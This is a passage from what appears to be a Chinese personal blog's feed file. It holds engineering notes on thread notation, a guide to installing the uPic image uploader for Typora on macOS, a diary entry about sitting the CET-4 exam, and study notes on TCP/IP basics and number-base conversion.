title="例子"></a>例子</h4><ol><li><blockquote><p>例如，<strong>G1/2LH</strong> </p><p>表示 <strong>55°非密封的圆柱内管螺纹</strong>，<strong>尺寸代号</strong>为1/2，<strong>左旋</strong>。</p></blockquote></li><li><blockquote><p>例如，<strong>Rc1/2LH</strong> </p><p>表示 <strong>55°密封的圆锥内管螺纹</strong>，<strong>尺寸代号</strong>为1/2，<strong>左旋</strong>。</p></blockquote></li></ol><h3 id="梯型螺纹的标注"><a href="#梯型螺纹的标注" class="headerlink" title="梯型螺纹的标注"></a>梯型螺纹的标注</h3><h4 id="标注内容"><a href="#标注内容" class="headerlink" title="标注内容"></a>标注内容</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">螺纹代号-螺纹公差带代号-螺纹旋合长度代号</span><br></pre></td></tr></table></figure><h4 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h4><blockquote><ol><li>梯型螺纹的<strong>螺纹代号</strong>由<strong>特征代号Tr</strong>和<strong>尺寸代号</strong>及<strong>旋向</strong>组成。</li><li><strong>单线</strong>梯形螺纹<strong>尺寸代号</strong>用“公称直径 x螺距”来表示，<br><strong>多线</strong>梯形螺纹尺寸代号用“公称直径x<strong>导程（P螺距）</strong>”来表示。</li><li>梯形螺线<strong>公差带代号</strong>只标注<strong>中径公差带代号</strong>。</li><li>按尺寸和螺距的大小分为中等<strong>旋合长度</strong>（N）和长旋合长度(L)。</li></ol></blockquote><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><ol><li><blockquote><p>例如，<strong>T40 ×7-7H</strong><br>表示<strong>公称直径</strong>为 40mmm，<strong>螺距</strong>为7mm 的<strong>单线右旋梯形螺纹</strong>（<strong>内螺纹</strong>），<strong>中径公差带代号</strong>为7H，<strong>中等旋合长度</strong>。</p></blockquote></li><li><blockquote><p>例如，<strong>Tr40 x 14（P7） LH-8e-L</strong> </p><p>表示<strong>公称直径</strong>为 40mm，<strong>导程</strong>为 14mm，<strong>螺距</strong>为 7mm 的<br><strong>双线左旋梯形螺纹</strong>（<strong>外螺纹</strong>），<strong>中径公差带代号</strong>为8e，<strong>长旋合长度</strong>。</p></blockquote></li></ol><h3 id="锯齿形螺纹的标注"><a href="#锯齿形螺纹的标注" class="headerlink" title="锯齿形螺纹的标注"></a>锯齿形螺纹的标注</h3><h4 id="标注内容-1"><a href="#标注内容-1" class="headerlink" title="标注内容"></a>标注内容</h4><blockquote><p><strong>锯齿形螺纹</strong>的<strong>标记内容</strong>和<strong>梯形螺纹</strong>基本<strong>相同</strong>。</p></blockquote><h4 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h4><blockquote><p>例如，<strong>B40 ×14 （P7）LH-8e-L</strong><br>表示<strong>公称直径尺寸</strong>为 40mm，<strong>导程</strong>为 14mm，<strong>螺距</strong>为 7mm<br>的<strong>双线左旋锅齿形螺纹</strong> （<strong>外螺纹</strong>），<strong>中径公差带代号</strong>为8e，<strong>长旋合长度</strong></p></blockquote><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul><li><p><strong>旋向、旋合长度</strong>易忘</p></li><li><p><strong>M</strong>开头<strong>不都</strong>是<strong>粗牙</strong>普通螺纹</p></li><li><p><strong>管螺纹</strong>标注内容<strong>无旋合长度</strong></p></li><li><p><strong>梯形</strong>只有<strong>中径</strong>公差带代号，<strong>中/长</strong>两等旋合长度</p></li><li><p><strong>锯齿形</strong>螺纹标注<strong>等同</strong>于<strong>梯形螺纹</strong></p></li><li><p>所有内容<strong>标注</strong>在<strong>大径尺寸线</strong></p></li></ul><p>(完)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现Typora图片自动上传</title>
      <link href="/2021/12/20/Mac%20OS%E5%AE%9E%E7%8E%B0Typora%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/12/20/Mac%20OS%E5%AE%9E%E7%8E%B0Typora%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Mac-OS实现Typora图片自动上传"><a href="#Mac-OS实现Typora图片自动上传" class="headerlink" title="Mac OS实现Typora图片自动上传"></a>Mac OS实现Typora图片自动上传</h1><h2 id="打开偏好设置"><a href="#打开偏好设置" class="headerlink" title="打开偏好设置"></a>打开偏好设置</h2><blockquote><p>如图选择，安装uPic</p></blockquote><p><img src="https://s2.loli.net/2021/12/20/YQtipqDf6MAc4vV.png" alt="image-20211220225249598"></p><h2 id="关于uPic（🍎特供"><a href="#关于uPic（🍎特供" class="headerlink" title="关于uPic（🍎特供"></a>关于uPic（🍎特供</h2><p><a href="https://github.com/gee1k/uPic">官方文档·地址1</a></p><p><a href="https://blog.svend.cc/upic/">官方文档·地址2</a></p><h3 id="📑-简介"><a href="#📑-简介" class="headerlink" title="📑 简介"></a>📑 简介</h3><blockquote><p>uPic(upload Picture) 是一款 Mac 端<strong>免费的开源的</strong>的图床(文件)上传客户端</p></blockquote><p><strong>💡 特点：</strong> 无论是本地文件、或者屏幕截图都可自动上传，菜单栏显示实时上传进度。上传完成后文件链接自动复制到剪切板，让你无论是在写博客、灌水聊天都能快速插入图片。 连接格式可以是普通 URL、HTML 或者 Markdown，仍由你掌控。</p><p><strong>🔋 支持图床：</strong> <a href="https://sm.ms/">smms</a>、 <a href="https://www.upyun.com/products/file-storage">又拍云 USS</a>、<a href="https://www.qiniu.com/products/kodo">七牛云 KODO</a>、 <a href="https://www.aliyun.com/product/oss/">阿里云 OSS</a>、 <a href="https://cloud.tencent.com/product/cos">腾讯云 COS</a>、 <a href="https://cloud.baidu.com/product/bos.html">百度云 BOS</a>、<a href="https://weibo.com/">微博</a>、<a href="https://github.com/settings/tokens">Github</a>、 <a href="https://gitee.com/profile/personal_access_tokens">Gitee</a>、 <a href="https://aws.amazon.com/cn/s3/">Amazon S3</a>、<a href="https://imgur.com/">Imgur</a>、<a href="https://blog.svend.cc/upic/tutorials/custom">自定义上传接口</a>、…</p><h3 id="🚀-如何安装"><a href="#🚀-如何安装" class="headerlink" title="🚀 如何安装"></a>🚀 如何安装</h3><h4 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h4><h5 id="1-AppStore-推荐"><a href="#1-AppStore-推荐" class="headerlink" title="1.AppStore(推荐):"></a>1.AppStore(推荐):</h5><blockquote><p>只有 AppStore 才是最新的版本。其他方式安装的停留在 <code>v0.21.1</code>，可以自行拉取代码编译打包。</p></blockquote><p><a href="https://apps.apple.com/cn/app/id1549159979"><img src="https://camo.githubusercontent.com/21d06297ea3e9b591140f29f8eb104d62c163a69c76b85e83e9ca23b219ea15d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f755069632f6170702d73746f72652d626c61636b2e737667" alt="uPic for macOS"></a></p><h5 id="2-Homebrew"><a href="#2-Homebrew" class="headerlink" title="2.Homebrew"></a>2.Homebrew</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span><span class="keyword">bigwig-club/brew/upic </span>--cask</span><br></pre></td></tr></table></figure><h5 id="3-手动"><a href="#3-手动" class="headerlink" title="3.手动"></a>3.手动</h5><p>从 <a href="https://github.com/gee1k/uPic/releases">Github release</a> 下载。</p><p><strong>如果在国内访问 Github 下载困难的，可以从<a href="https://gitee.com/gee1k/uPic/releases">Gitee release</a>下载。</strong></p><h4 id="检查-Finder-扩展权限"><a href="#检查-Finder-扩展权限" class="headerlink" title="检查 Finder 扩展权限"></a>检查 Finder 扩展权限</h4><ul><li><p>1.打开 uPic</p></li><li><p>2.打开<code>系统偏好设置</code> - <code>扩展</code> - <code>访达扩展</code> 确保 <code>uPicFinderExtension</code>是勾选状态</p><p><img src="https://camo.githubusercontent.com/00009e0d18a62cd5d7d03276493571452cef6f3dd6f3a32e1fadd6852cc8bd5f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f66696e6465722d657874656e73696f6e2e706e67" alt="img"></p></li></ul><h3 id="🕹-使用方式"><a href="#🕹-使用方式" class="headerlink" title="🕹 使用方式"></a>🕹 使用方式</h3><table><thead><tr><th>功能</th><th>描述</th><th>预览</th></tr></thead><tbody><tr><td><strong>🖥 选择文件上传</strong></td><td>从<code>Finder</code>选择文件上传。<code>可设置全局快捷键</code></td><td><a href="https://camo.githubusercontent.com/3f3fc335a214472e453decf4515cc48ba4808fb50638322c1605907bdd49482d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f73656c65637446696c652e676966"><img src="https://camo.githubusercontent.com/3f3fc335a214472e453decf4515cc48ba4808fb50638322c1605907bdd49482d/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f73656c65637446696c652e676966" alt="img"></a></td></tr><tr><td><strong>⌨️ 复制文件上传</strong></td><td>上传已拷贝到剪切板的文件。<code>可设置全局快捷键</code></td><td><a href="https://camo.githubusercontent.com/a772ed5859679160e51d4f2485ffa3ae22500aa1767d70de04be9680855bdd6a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f7061737465626f6172642e676966"><img src="https://camo.githubusercontent.com/a772ed5859679160e51d4f2485ffa3ae22500aa1767d70de04be9680855bdd6a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f7061737465626f6172642e676966" alt="img"></a></td></tr><tr><td><strong>📸 截图上传</strong></td><td>直接拉框截图上传。<code>可设置全局快捷键</code></td><td><a href="https://camo.githubusercontent.com/485947fce32533689f3aba2b9e55a13056cded230ddcbeea9fbf90466653f0cb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f73637265656e73686f742e676966"><img src="https://camo.githubusercontent.com/485947fce32533689f3aba2b9e55a13056cded230ddcbeea9fbf90466653f0cb/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f73637265656e73686f742e676966" alt="img"></a></td></tr><tr><td><strong>🖱 拖拽本地文件上传</strong></td><td>拖拽文件到状态栏上传</td><td><a href="https://camo.githubusercontent.com/9a46352980e7c474e7fcb6348db4ef38a563aa4da02a96d84588ef3f71837b71/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f6472616746696c652e676966"><img src="https://camo.githubusercontent.com/9a46352980e7c474e7fcb6348db4ef38a563aa4da02a96d84588ef3f71837b71/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f6472616746696c652e676966" alt="img"></a></td></tr><tr><td><strong>🖱 拖拽浏览器图片上传</strong></td><td>从浏览器拖拽图片到状态栏上传</td><td><a href="https://camo.githubusercontent.com/bc54bcb5dca37c88eaf14ed1e15db773738dceb05b4b21d640fe1a1e247c9e3a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f6472616746726f6d42726f777365722e676966"><img src="https://camo.githubusercontent.com/bc54bcb5dca37c88eaf14ed1e15db773738dceb05b4b21d640fe1a1e247c9e3a/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f6472616746726f6d42726f777365722e676966" alt="img"></a></td></tr><tr><td><strong>📂 Finder 中右键上传</strong></td><td>右击文件上传</td><td><a href="https://camo.githubusercontent.com/53285c225446a778b9bdc28c4709922315829c0f36639f6db5ef43a3876494b7/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f636f6e746578746d656e752e676966"><img src="https://camo.githubusercontent.com/53285c225446a778b9bdc28c4709922315829c0f36639f6db5ef43a3876494b7/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f636f6e746578746d656e752e676966" alt="img"></a></td></tr><tr><td><strong>⌨️ 命令行上传</strong></td><td>通过执行命令调用 uPic 上传文件</td><td><a href="https://camo.githubusercontent.com/abbda7ecffe19f94d7ba401b91cb67635d869ef800e8089f9e7c78a66e9a1e9c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f636c692e676966"><img src="https://camo.githubusercontent.com/abbda7ecffe19f94d7ba401b91cb67635d869ef800e8089f9e7c78a66e9a1e9c/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f676565316b2f6f7373406d61737465722f73637265656e73686f742f755069632d636e2f636c692e676966" alt="img"></a></td></tr></tbody></table><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li><p>下载后，把uPic拖到“<strong>应用程序</strong>” 文件夹</p><p><img src="https://s2.loli.net/2021/12/20/Q8mhyKpYNCgst6c.png" alt="image-20211220230533259"></p></li><li><p><strong>验证</strong></p></li></ol><blockquote><p>点击“验证图片上传选项”，验证成功即大功告成。</p></blockquote><ol start="3"><li><p>效果</p><ul><li>复制图片到Typora.</li></ul><p><img src="https://s2.loli.net/2021/12/20/7hOce2Mj8K6JtFw.png" alt="image-20211220230718439"></p><ul><li><p>可见，上传成功后路径自动更改</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![image-<span class="number">20211220230718439</span>](https:<span class="regexp">//</span>s2.loli.net<span class="regexp">/2021/</span><span class="number">12</span><span class="regexp">/20/</span><span class="number">7</span>hOce2Mj8K6JtFw.png)</span><br></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Mac OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂记一</title>
      <link href="/2021/12/18/%E6%9D%82%E8%AE%B0%E4%B8%80/"/>
      <url>/2021/12/18/%E6%9D%82%E8%AE%B0%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <div id="aplayer-GnUtvRtH" class="aplayer aplayer-tag-marker" style="margin-bottom: 20px;">            <pre class="aplayer-lrc-content"></pre>        </div>        <script>          var ap = new APlayer({            element: document.getElementById("aplayer-GnUtvRtH"),            narrow: false,            autoplay: true,            showlrc: false,            music: {              title: "Born To Fire",              author: "艾福杰尼",              url: "http://cun.harry0597.com/Blog/Born2Fire.mp3",              pic: "http://cun.harry0597.com/Blog/5Yi.png",              lrc: ""            }          });          window.aplayers || (window.aplayers = []);          window.aplayers.push(ap);        </script><h1 id="今天是空闲的"><a href="#今天是空闲的" class="headerlink" title="今天是空闲的"></a>今天是空闲的</h1><p>  <strong>十二月十八日</strong>是CET-4即四级考试的日子。</p><p>  为了提供场地，图书馆、丹青楼（教学楼）都被征用了。</p><p>  紧锣密鼓的，人群在窜动。</p><p>  清晨八点半考点报道，晌午十一点二十便结束了。</p><p>  时间是撞上了，刚刚好吃上口热饭。</p><hr><h1 id="考的并不理想"><a href="#考的并不理想" class="headerlink" title="考的并不理想"></a>考的并不理想</h1><p>  “没有安排好来。”</p><p>  走在路上，我在想着这个问题。</p><p>  不同于刚来时，无方向可寻的迷茫，而是方向有些多了，学业繁重而热情分散。</p><p>  或许最大的困惑，是<strong>自学</strong>大学学科<strong>缺乏</strong>了<strong>科学安排与节奏感</strong>，学业显得极端繁重。</p><p>  连基本学科内容都准备的匆忙，何况这有多次机会的四级呢？</p><p>  <strong>我在逃避，但确实在往前走</strong>，路过文法学院。</p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcXwZ62ogyeL*IljBkwngA5IrsAaa68CDSmNdrk.OUomtpPliMccqL*tEHC6yGXOWEcLBsh92fqbLWLtPHkrWXpg!/b&bo=oAU4BAAAAAABN4k!&rf=viewer_4" alt="对街“松鼠乐”"></p><hr><h1 id="天晴雪明"><a href="#天晴雪明" class="headerlink" title="天晴雪明"></a>天晴雪明</h1><p>  再走几步，就到俭德（食堂名）了。</p><p>  或许，我本该有些忧愁的。</p><p>  <strong>但还有机会。</strong></p><p>  还有试错的机会，并不是庆幸，用“下次”来麻痹自己。</p><p>  而是，为这自由本能的向往。</p><blockquote><p><strong>It’s my own design</strong><br><strong>It’s my own remorse</strong><br><strong>Acting on your best behavior</strong><br><strong>Turn your back on mother nature</strong><br>                               – 《Born To Fire》</p></blockquote><p>  诚然，选择了报名，却没有充分准备无疑是过错。</p><p>  但然后呢？</p><p>  我没有失去自己最纯粹的追求，走过的每一步都无愧于心。</p><p>  我收获的不止是失败。</p><p>  <strong>属于自己的人生，完全由自己设计，为此负担所有责任。</strong></p><hr><h1 id="到食堂了"><a href="#到食堂了" class="headerlink" title="到食堂了"></a>到食堂了</h1><p>  点下了菜。</p><p>  哈哈，吃的不是果蔬肉蛋，而是<strong>人间烟火！</strong></p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcYbP4vBhKWZ7y2piI9p0s3URt5AgNj*oAHK9VR0ADvRIbDWVFklqWr4ffAfxPXvfAXwUkJW3kUFk*w6PWk9PGWI!/b&bo=4AVOAwAAAAABJ6g!&rf=viewer_4" alt="黑椒肥牛饭"></p><p>  不用多想，吃下这口热饭。</p><p>  挺起胸膛，堂堂正正的。</p><h1 id="趁脑子发热，我们要不顾一切。"><a href="#趁脑子发热，我们要不顾一切。" class="headerlink" title="趁脑子发热，我们要不顾一切。"></a>趁脑子发热，我们要不顾一切。</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 杂 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP/IP学习</title>
      <link href="/2021/12/15/TCP:IP%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/12/15/TCP:IP%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="《图解TCP-IP》笔记"><a href="#《图解TCP-IP》笔记" class="headerlink" title="《图解TCP/IP》笔记"></a>《图解TCP/IP》笔记</h1><h2 id="第1章·网络基础知识"><a href="#第1章·网络基础知识" class="headerlink" title="第1章·网络基础知识"></a>第1章·网络基础知识</h2><h3 id="1-1-计算机网络出现背景"><a href="#1-1-计算机网络出现背景" class="headerlink" title="1.1 计算机网络出现背景"></a>1.1 计算机网络出现背景</h3><h4 id="从独立模式到网络互联模式"><a href="#从独立模式到网络互联模式" class="headerlink" title="从独立模式到网络互联模式"></a>从独立模式到网络互联模式</h4><blockquote><p>It comes ture the sharing of computer resource and users can enjoy services on their own computers at the same time.</p></blockquote><h4 id="计算机网络分类（规模）"><a href="#计算机网络分类（规模）" class="headerlink" title="计算机网络分类（规模）"></a>计算机网络分类（规模）</h4><ul><li>Wide Area Network (WAN)</li><li>Metropolitan Area Network (MAN) </li><li>Local Area Network (LAN)</li></ul><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h4><ul><li>邮件组：This means  that administrator’s new email will be send to all group members. </li><li>SNS: Social network like WeChat circle of friends.</li></ul><hr><h3 id="1-2-发展的七个阶段"><a href="#1-2-发展的七个阶段" class="headerlink" title="1.2 发展的七个阶段"></a>1.2 发展的七个阶段</h3><h4 id="批处理-Batch-Processing"><a href="#批处理-Batch-Processing" class="headerlink" title="批处理 Batch Processing"></a>批处理 Batch Processing</h4><blockquote><p>At first, people used 卡带 to place process and send it into Batch Processing System.</p></blockquote><h4 id="分时系统-Time-Sharing-System"><a href="#分时系统-Time-Sharing-System" class="headerlink" title="分时系统 Time Sharing System"></a>分时系统 Time Sharing System</h4><blockquote><p>Many people use their own machine connected to the main server, which makes them feel like as if they have monopolized server.</p></blockquote><p><img src="https://s2.loli.net/2021/12/15/CTs8OzFXumB7rhy.png" alt="tp"></p><h4 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h4><blockquote><p>TCP/IP is a collective name of communication <strong>protocols</strong>.</p></blockquote><h4 id="Tips-1"><a href="#Tips-1" class="headerlink" title="Tips:"></a>Tips:</h4><ul><li>The Time Sharing System does not  solve the problem of communication between computers. It was time to develop computer communication technology! </li><li>IP: <strong>Internet Protocol</strong></li><li>SOHO: <strong>Small Office and Home Office</strong>.This means that companies where employees work in small offices or just at home.</li><li>VoIP: <strong>Voice over Internet Protocol</strong>. A service for transmitting voice over Internet Protocol.</li><li>iSCSI:<strong>Internet Small Computer Systems Interface</strong></li></ul><hr><h3 id="1-3-协议"><a href="#1-3-协议" class="headerlink" title="1.3 协议"></a>1.3 协议</h3><table><thead><tr><th>Network architecture</th><th>Protocols</th><th>Main purpose</th></tr></thead><tbody><tr><td>TCP/IP</td><td>IP, ICMP, TCP, UDP, HTTP, TELNET. SNMP. SMTP..</td><td>Internet、LAN</td></tr><tr><td>IPX/SPX<br />(NetWare)</td><td>IPX，SPX，NPC…</td><td>PC LAN</td></tr><tr><td>AppleTalk</td><td>DDP,RTMP,AEP,ATP,ZIP…</td><td>Apple productions’LAN</td></tr><tr><td>DECnet</td><td>DPR,NSP,SCP…</td><td>Front DEC minicomputer</td></tr><tr><td>OSI</td><td>FTAM, MOIS, VT, CMIS/CMIP, CLNP, CONP…</td><td>-</td></tr><tr><td>XNS</td><td>IDP,SPP,PEP</td><td>Xerox Network</td></tr></tbody></table><span id="more"></span><h4 id="CPU-与-OS"><a href="#CPU-与-OS" class="headerlink" title="CPU 与 OS"></a>CPU 与 OS</h4><ul><li><p>CPU <a href="https://zhuanlan.zhihu.com/p/21266987">ARM | X86</a></p></li><li><p>OS</p><blockquote><p>UNIX、Windows、Mac OS X、Linux</p></blockquote></li></ul><h4 id="Protocol"><a href="#Protocol" class="headerlink" title="Protocol"></a>Protocol</h4><blockquote><p>Because the difference of CPU and OS, in order to transmit data correctky, they should  abide same Protocol</p></blockquote><h4 id="分组交换协议"><a href="#分组交换协议" class="headerlink" title="分组交换协议"></a>分组交换协议</h4><blockquote><p>将大数据分割为若干个小包(Packet)，更高效、稳定地传输</p></blockquote><ul><li><p>包（Packet）</p><blockquote><p>内含<strong>报文首部</strong>： 由源主机地址（发送端地址）和目标地址（接收端地址）组成。</p><p>为了让不用型号的器械可以互相接、发包，协议应运而生。</p></blockquote></li></ul><hr><h3 id="1-4-协议由谁规定"><a href="#1-4-协议由谁规定" class="headerlink" title="1.4 协议由谁规定"></a>1.4 协议由谁规定</h3><h3 id="协议规定者"><a href="#协议规定者" class="headerlink" title="协议规定者"></a>协议规定者</h3><h3 id="协议分层与OSI"><a href="#协议分层与OSI" class="headerlink" title="协议分层与OSI"></a>协议分层与OSI</h3><h3 id="OSI举例"><a href="#OSI举例" class="headerlink" title="OSI举例"></a>OSI举例</h3><h3 id="传输方式的分类"><a href="#传输方式的分类" class="headerlink" title="传输方式的分类"></a>传输方式的分类</h3><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><h3 id="网络构成要素"><a href="#网络构成要素" class="headerlink" title="网络构成要素"></a>网络构成要素</h3><h3 id="现代网络实态"><a href="#现代网络实态" class="headerlink" title="现代网络实态"></a>现代网络实态</h3>]]></content>
      
      
      
        <tags>
            
            <tag> CS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机基础 &amp; Raptor</title>
      <link href="/2021/12/12/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%20&amp;%20Raptor/"/>
      <url>/2021/12/12/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%20&amp;%20Raptor/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="大学计算机基础笔记"><a href="#大学计算机基础笔记" class="headerlink" title="大学计算机基础笔记"></a>大学计算机基础笔记</h1><h2 id="数制及其相互转换"><a href="#数制及其相互转换" class="headerlink" title="数制及其相互转换"></a>数制及其相互转换</h2><h3 id="资料阅读"><a href="#资料阅读" class="headerlink" title="资料阅读"></a>资料阅读</h3><ul><li><p>必要性</p><blockquote><p>计算机主要功能是信息处理。而在计算机内部，各种信息（文字、图片、音频、视频等）都是以<strong>二进制</strong>数据存储、传输。</p></blockquote></li><li><p>二进制编码优势</p><blockquote><p>运算简单、电路实现方便、成本低廉、工作可靠</p></blockquote></li></ul><h3 id="进位计数制"><a href="#进位计数制" class="headerlink" title="进位计数制"></a>进位计数制</h3><ul><li><p>定义</p><blockquote><p>进位计数制就是按进位的方法进行数据的运算。常用进制有<strong>二进制、八进制、十六进制</strong>。</p></blockquote></li><li><p>组成因素</p><blockquote><p>(1)<strong>数码</strong></p><p>一组用来表示某种数制的<strong>符号</strong>.如：1，2，3，4，A，B</p><p>(2)<strong>基数</strong></p><p>数制所用<strong>数码的个数</strong>，用R表示。如十六进制的基数为16，即：R=16；数码为：   0，12，3，4，5，6，7，8，9，A，B，C，D，E，F.</p><p>(3)<strong>进位原则</strong><br>逢R进一.</p><p>(4)<strong>位权</strong></p><p>数码在不同位置上的权值。一个数的个位、十位、百位···的位权都不一样。例如十进制下，个位数的位权是$10^{0}$，十位数的位权是 $10^{1}$</p></blockquote></li><li><p>进制缩写</p><blockquote><p>二进制：<strong>B</strong></p><p>八进制：<strong>O</strong></p><p>十进制：<strong>D</strong></p><p>十六进制：<strong>H</strong></p></blockquote></li></ul><ul><li><p>例子：</p><p>1101.11这个二进制数，其各位的位权分别为  $2^{3}$  $2^{2}$  $2^{1}$  $2^{0}$  $2^{-1}$  $2^{-2}$</p><p>所以这个数可以写成：<br>$$<br>1101.11=1 \times 2^{3}+1\times2^{2}+0\times2^{1}+1\times2^{0}+1\times2^{-1}+1\times2^{-2}<br>$$<br>特别的，右边这种利用位权“展开来”写的方式，叫做<strong>位权展开法</strong></p></li></ul><h3 id="数制之间的转换"><a href="#数制之间的转换" class="headerlink" title="数制之间的转换"></a>数制之间的转换</h3><h4 id="R进制转换为十进制"><a href="#R进制转换为十进制" class="headerlink" title="R进制转换为十进制"></a>R进制转换为十进制</h4><ul><li>规则</li></ul><blockquote><p>任何R进制数<strong>位权展开</strong>后的结果相加即为此数的十进制数。 </p><p>如：<br>$$ 1101.11=2^{3}+1\times2^{2}+0\times2^{1}+1\times2^{0}+1\times2^{-1}+1\times2^{-2}=13.75$$</p><p>即：<br>$1101.11_2$ = $17.75_{10} $</p></blockquote><h4 id="十进制转换为R进制"><a href="#十进制转换为R进制" class="headerlink" title="十进制转换为R进制"></a>十进制转换为R进制</h4><ul><li>规则(与基数R做计算)</li></ul><blockquote><p>整除逆取</p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcYfw*AMG5vKwgtJQ2X3Pm*P2ijrWTVz6cg1hg6havGWEfrp9fYHSsSBCXxujBToFVQ.QJsZwfjU8ooDEZb9HmVQ!/b&bo=jwk4BAAAAAADhxg!&rf=viewer_4" alt="截屏2021-12-11 下午7.54.35"></p></blockquote><blockquote><p>小乘顺取<br><img src="https://s2.loli.net/2021/12/12/c32m4zbMDlNSPFx.png" alt="截屏2021-12-11 下午7.57.42"></p></blockquote><h4 id="二进制与八进制、十六进制互转"><a href="#二进制与八进制、十六进制互转" class="headerlink" title="二进制与八进制、十六进制互转"></a>二进制与八进制、十六进制互转</h4><blockquote><p><strong>二进制转八进制</strong>： 8= 2^3^ 所以，二进制转八进制即补全后（前后补零）每三个数一组， 分别转换后拼接.</p><p><strong>二进制转十六进制</strong>： 如上.</p><p>同理，可得到：<br><strong>八进制转二进制</strong>：每个数码从八转十进制（位权展开）再转二进制（整除逆取、小乘顺取），删去无意义的0.</p><p><strong>十六进制转二机制</strong>：如上.</p></blockquote><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><ul><li><p>逻辑与</p><blockquote><p>法则为<strong>同时</strong>为1才为1的运算。</p><p>亦叫做<strong>逻辑乘法</strong>, <strong>逻辑积</strong>, 符号为 <strong>·</strong></p><p>0 · 0 = 0</p><p>0 · 1 = 0</p><p>1 · 1 = 1</p><p>结果上等效于做乘法。</p></blockquote></li><li><p>逻辑或</p><blockquote><p> 法则为<strong>有</strong>1则为1的运算。</p><p> 亦叫做<strong>逻辑加法</strong>, <strong>逻辑和</strong>, 符号为 <strong>+</strong></p><p> 0 + 0 = 0</p><p> 0 + 1 = 1</p><p> 1 + 1 = 1</p><p> 亦叫做<strong>逻辑加法</strong></p></blockquote></li><li><p>逻辑非</p><blockquote></blockquote></li><li><p>逻辑异或</p></li></ul><h2 